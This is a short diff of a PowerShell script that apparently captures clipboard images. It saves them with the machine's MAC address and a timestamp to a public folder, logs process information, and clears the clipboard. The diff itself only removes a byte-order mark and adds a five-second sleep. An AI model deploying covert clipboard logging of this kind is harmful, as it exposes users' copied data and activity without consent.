@@ -1,4 +1,4 @@
-﻿Add-Type @"
+Add-Type @"
   using System;
   using System.Runtime.InteropServices;
   public class Tricks {
@@ -18,6 +18,7 @@ $path = 'C:\Users\Public\Documents'
 $filename = "$path\${mac}_"+(Get-date -f yyyyMMddHHmmss)+"_clip.png"
 $content.Save($filename,'png')
 $process | out-file C:\Users\Public\Documents\${mac}_$(get-date -f yyyyMMddHHmmss)_clib_process.txt -Append -encoding utf8
+sleep 5
 Set-Clipboard -Value $Null
 }
 
